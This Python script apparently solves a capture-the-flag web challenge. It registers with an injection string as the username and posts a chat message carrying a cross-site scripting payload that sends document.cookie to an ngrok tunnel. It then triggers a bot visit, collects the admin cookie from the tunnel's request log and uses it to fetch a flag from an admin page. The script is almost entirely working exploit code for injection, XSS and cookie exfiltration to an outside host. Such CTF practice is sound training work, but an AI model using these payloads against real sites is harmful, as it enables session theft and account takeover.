#!/usr/bin/env python3

from pyngrok import conf, ngrok
from bs4 import BeautifulSoup
from time import sleep
import requests
import urllib3
import random
import string
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PORT = 5000

if len(sys.argv) == 1:
    print(f"Usage: {sys.argv[0]} https://url.for.challenge.tld")
    exit(1)
url = sys.argv[1]


def generate_random_email(domain="example.com", length=10):
    username = ''.join(random.choices(
        string.ascii_lowercase + string.digits, k=length))
    email = f"{username}@{domain}"
    return email


s = requests.Session()
s.verify = False

response = s.post(
    url + "/api/register",
    json={
        "username": "' || '1'=='1",
        "email": generate_random_email(),
        "password": "test",
        "confirmPassword": "test"
    }
)
set_cookie = response.headers.get('Set-Cookie')

response = s.post(
    url + "/api/premiumEligibility",
    headers={"Cookie": set_cookie}
)
response = s.get(
    url + "/premium",
    headers={"Cookie": set_cookie}
)

pyngrok_config = conf.PyngrokConfig(ngrok_path=None, config_path=None, auth_token=None, region=None, monitor_thread=True, log_event_callback=None,
                                    startup_timeout=15, max_logs=100, request_timeout=4, start_new_session=False, ngrok_version='v3', api_key=None)
conf.set_default(pyngrok_config)
n = ngrok.connect(PORT)
response = s.post(
    url + "/api/sendMessage",
    json={
        "girlfriendId": "cucalampa",
        "message": f"\\\"; fetch('/_next/image?url={n.public_url}?cookie=' + document.cookie + '&w=640&q=75') //"
    },
    headers={"Cookie": set_cookie, }
)

response = s.post(
    url + "/api/report",
    json={
        "chatBot": "cucalampa",
    },
    headers={"Cookie": set_cookie}
)

run = 0
while run < 4:
    sleep(5)
    API_URL = "http://localhost:4040/api/requests/http"
    response = s.get(API_URL).json()
    if len(response["requests"]) > 0:
        cookie = response["requests"][0]["request"]["uri"].replace(
            "/?cookie=", "")
        response = s.get(url + "/admin-page-very-important", headers={
            "Cookie": cookie
        })
        soup = BeautifulSoup(response.text, "html.parser")
        flag = soup.find("code").text
        print(flag)
        exit(0)
    run += 1
print("no flag :-(")
